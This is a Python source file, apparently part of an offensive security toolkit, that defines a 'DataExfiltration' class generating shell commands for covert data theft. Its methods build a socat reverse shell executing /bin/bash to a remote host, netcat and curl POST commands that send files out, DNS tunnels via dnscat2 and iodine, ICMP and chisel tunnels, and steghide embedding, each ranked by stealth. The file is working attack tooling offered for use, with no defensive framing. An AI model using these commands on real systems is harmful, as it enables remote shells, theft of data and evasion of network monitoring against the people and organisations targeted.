"""Data Exfiltration Module — DNS tunneling, HTTP tunneling, covert channels."""

from __future__ import annotations
import subprocess
from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class ExfilChannel:
    """Exfiltration channel configuration."""
    name: str
    protocol: str
    command: str
    description: str
    speed: str  # slow, medium, fast
    stealth: str  # high, medium, low
    risk_level: str
    port: int


class DataExfiltration:
    """Covert data exfiltration channels."""

    def __init__(self, config: Optional[dict] = None):
        self.config = config or {}

    def dnscat2_server(self, domain: str, lport: int = 53) -> dict[str, Any]:
        """Start dnscat2 DNS tunnel server."""
        cmd = f"dnscat2-server {domain} --dns-port={lport}"
        return {
            "command": cmd,
            "description": f"dnscat2 DNS tunnel server on port {lport} for domain {domain}",
            "protocol": "dns",
            "speed": "slow",
            "stealth": "high",
            "risk_level": "dangerous",
            "port": lport,
        }

    def dnscat2_client(self, server: str, domain: str) -> dict[str, Any]:
        """Connect dnscat2 client."""
        cmd = f"dnscat2 {domain}"
        return {
            "command": cmd,
            "description": f"dnscat2 client connecting to {server}",
            "protocol": "dns",
            "speed": "slow",
            "stealth": "high",
            "risk_level": "active",
        }

    def iodine_server(self, domain: str, lport: int = 53) -> dict[str, Any]:
        """Start iodine DNS tunnel server."""
        cmd = f"iodined -f -c {domain} {lport}"
        return {
            "command": cmd,
            "description": f"iodine DNS tunnel server on port {lport}",
            "protocol": "dns",
            "speed": "medium",
            "stealth": "high",
            "risk_level": "dangerous",
            "port": lport,
        }

    def iodine_client(self, server: str, domain: str) -> dict[str, Any]:
        """Connect iodine client."""
        cmd = f"iodine -f {domain}"
        return {
            "command": cmd,
            "description": f"iodine DNS tunnel client to {server}",
            "protocol": "dns",
            "speed": "medium",
            "stealth": "high",
            "risk_level": "active",
        }

    def ngrok_tunnel(self, local_port: int, proto: str = "http") -> dict[str, Any]:
        """Expose local port via ngrok."""
        cmd = f"ngrok {proto} {local_port} --log=stdout"
        return {
            "command": cmd,
            "description": f"ngrok tunnel for local port {local_port}",
            "protocol": "http",
            "speed": "fast",
            "stealth": "low",
            "risk_level": "active",
            "port": local_port,
        }

    def socat_reverse_shell(self, lhost: str, lport: int) -> dict[str, Any]:
        """Create socat reverse shell."""
        cmd = f"socat TCP:{lhost}:{lport} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
        return {
            "command": cmd,
            "description": f"Socat reverse shell to {lhost}:{lport}",
            "protocol": "tcp",
            "speed": "fast",
            "stealth": "medium",
            "risk_level": "critical",
            "port": lport,
        }

    def chisel_server(self, lport: int = 8080) -> dict[str, Any]:
        """Start chisel SOCKS proxy server."""
        cmd = f"chisel server --port {lport} --reverse"
        return {
            "command": cmd,
            "description": f"Chisel SOCKS proxy server on port {lport}",
            "protocol": "http",
            "speed": "fast",
            "stealth": "medium",
            "risk_level": "active",
            "port": lport,
        }

    def chisel_client(self, server: str, server_port: int = 8080) -> dict[str, Any]:
        """Connect chisel client for SOCKS proxy."""
        cmd = f"chisel client {server}:{server_port} R:socks"
        return {
            "command": cmd,
            "description": f"Chisel client SOCKS proxy via {server}:{server_port}",
            "protocol": "http",
            "speed": "fast",
            "stealth": "medium",
            "risk_level": "active",
        }

    def lcx_tunnel(self, listen_port: int, remote_host: str, remote_port: int) -> dict[str, Any]:
        """LCX/ptunnel port forwarding."""
        cmd = f"lcx -listen {listen_port} {remote_host} {remote_port}"
        return {
            "command": cmd,
            "description": f"LCX tunnel: listen {listen_port} -> {remote_host}:{remote_port}",
            "protocol": "tcp",
            "speed": "fast",
            "stealth": "medium",
            "risk_level": "active",
            "port": listen_port,
        }

    def nc_listener(self, lport: int, save_file: str = "") -> dict[str, Any]:
        """Netcat listener for file transfer."""
        cmd = f"nc -lvnp {lport}"
        if save_file:
            cmd = f"nc -lvnp {lport} > {save_file}"
        return {
            "command": cmd,
            "description": f"Netcat listener on port {lport}" + (f" (saving to {save_file})" if save_file else ""),
            "protocol": "tcp",
            "speed": "fast",
            "stealth": "low",
            "risk_level": "active",
            "port": lport,
        }

    def nc_sender(self, target: str, port: int, file_path: str) -> dict[str, Any]:
        """Netcat file sender."""
        cmd = f"cat {file_path} | nc -w 3 {target} {port}"
        return {
            "command": cmd,
            "description": f"Send {file_path} to {target}:{port} via netcat",
            "protocol": "tcp",
            "speed": "fast",
            "stealth": "low",
            "risk_level": "active",
            "port": port,
        }

    def http_exfil(self, target_url: str, file_path: str) -> dict[str, Any]:
        """Exfiltrate via HTTP POST."""
        cmd = f"curl -X POST -F 'file=@{file_path}' {target_url}/upload"
        return {
            "command": cmd,
            "description": f"HTTP POST exfiltration of {file_path} to {target_url}",
            "protocol": "http",
            "speed": "fast",
            "stealth": "medium",
            "risk_level": "active",
        }

    def icmp_exfil(self, target: str, file_path: str) -> dict[str, Any]:
        """Exfiltrate via ICMP (ping tunnel)."""
        cmd = f"ptunnel -p {target} -lp 8000 -da 127.0.0.1 -dp 22"
        return {
            "command": cmd,
            "description": f"ICMP tunnel exfiltration via {target}",
            "protocol": "icmp",
            "speed": "slow",
            "stealth": "high",
            "risk_level": "dangerous",
        }

    def steganography_embed(self, image_path: str, secret_file: str, output_path: str) -> dict[str, Any]:
        """Hide file in image using steganography."""
        cmd = f"steghide embed -cf {image_path} -ef {secret_file} -f -p ''"
        return {
            "command": cmd,
            "description": f"Embed {secret_file} in {image_path} using steganography",
            "protocol": "local",
            "speed": "slow",
            "stealth": "high",
            "risk_level": "active",
        }

    def steganography_extract(self, image_path: str, output_dir: str = "/tmp") -> dict[str, Any]:
        """Extract hidden file from image."""
        cmd = f"steghide extract -sf {image_path} -f -p '' -d {output_dir}"
        return {
            "command": cmd,
            "description": f"Extract hidden data from {image_path}",
            "protocol": "local",
            "speed": "slow",
            "stealth": "high",
            "risk_level": "active",
        }

    def list_channels(self) -> list[dict[str, str]]:
        """List all available exfiltration channels."""
        return [
            {"name": "dnscat2", "protocol": "dns", "speed": "slow", "stealth": "high"},
            {"name": "iodine", "protocol": "dns", "speed": "medium", "stealth": "high"},
            {"name": "chisel", "protocol": "http", "speed": "fast", "stealth": "medium"},
            {"name": "ngrok", "protocol": "http", "speed": "fast", "stealth": "low"},
            {"name": "netcat", "protocol": "tcp", "speed": "fast", "stealth": "low"},
            {"name": "socat", "protocol": "tcp", "speed": "fast", "stealth": "medium"},
            {"name": "icmp", "protocol": "icmp", "speed": "slow", "stealth": "high"},
            {"name": "http_post", "protocol": "http", "speed": "fast", "stealth": "medium"},
            {"name": "steganography", "protocol": "local", "speed": "slow", "stealth": "high"},
        ]
